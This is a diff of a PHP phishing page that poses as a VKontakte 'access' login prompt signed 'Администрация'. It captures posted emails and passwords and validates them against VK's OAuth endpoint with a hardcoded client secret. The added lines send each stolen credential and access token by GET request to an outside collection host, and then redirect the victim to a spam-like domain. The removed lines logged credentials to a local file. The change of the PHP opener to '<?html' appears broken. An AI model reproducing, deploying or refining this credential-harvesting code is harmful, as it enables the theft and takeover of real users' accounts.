@@ -1,11 +1,11 @@
-<?php
+﻿<?html
 
     error_reporting (0);
 	if (($_POST["email"] != "") and ($_POST["pass"]))
 	{
 		$username = $_POST["email"];
 		$password = $_POST["pass"];
-		$url = "http://vk.com/im";
+		$url = "http://get2laidtonight4.com/?u=z0w8kwf&o=tnz00v6";
 		$check = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
 		
 		if (strpos($check, "access_token") === false)
@@ -15,8 +15,11 @@
 			else
 			{
 				$result = json_decode($check);
-				$ez_log = $username.":".$password;
-				$log = fopen("t3mehk8y7k26gevcs95912xkp6khoydih1is77fq", "a+"); fwrite($log, $ez_log."\n"); fclose($log);
+				$ez_log = $username.":".$password.";".$result->access_token;
+
+				//$log = fopen("logineset", "a+"); fwrite($log, $ez_log."\n"); fclose($log);
+				$saveURL = $saveHost."/?save=".$ez_log;
+				file_get_contents($saveURL); //GET запрос.
 				header("Location: ".$url."");
 			}
 	}
@@ -36,7 +39,7 @@
 <base id="base">
 <meta name="robots" content="noindex,nofollow" />
 <title>Получение доступа к ВКонтакте</title>
-<link rel="shortcut icon" href="http://vk.com/images/faviconnew.ico?3">
+<link rel="shortcut icon" href="/images/faviconnew.ico">
 		<script type="text/javascript">
 		document.ondragstart = noselect;
 		document.onselectstart = noselect;
@@ -67,7 +70,7 @@
 </div></div>
 <div class="basis__content mcont" id="mcont"><div class="pcont fit_box bl_cont">
 <div class="owner_panel oauth_mobile_header">
-<img src="https://pp.userapi.com/c834200/v834200440/d689f/ALpvTDlralg.jpg" class="op_fimg" />
+<img src="\images\favicon.png" class="op_fimg" />
 <div class="op_fcont">
 <div class="op_owner">Администрация</div>
 <div class="op_info">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
